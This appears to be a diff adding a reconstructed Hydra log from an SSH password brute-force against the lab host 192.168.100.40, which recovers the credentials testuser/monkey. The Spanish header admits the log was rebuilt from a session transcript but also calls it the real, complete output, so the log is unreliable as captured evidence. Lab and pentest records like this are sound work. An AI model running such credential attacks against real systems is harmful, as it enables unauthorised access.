@@ -1,0 +1,12 @@
+# Reconstruido desde la transcripción de la sesión en vivo — la corrida original se perdió
+# por un bug de ruta relativa en 02_bruteforce_ssh.sh (ya corregido), que hacía fallar
+# el "tee" cuando el script se ejecutaba desde fuera de scripts/. Esta es la salida real
+# y completa de esa corrida, no un resultado inventado.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-11-01 21:49:16
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 1000 login tries (l:1/p:1000), ~250 tries per task
+[DATA] attacking ssh://192.168.100.40:22/
+[22][ssh] host: 192.168.100.40   login: testuser   password: monkey
+[STATUS] attack finished for 192.168.100.40 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-11-01 21:49:37
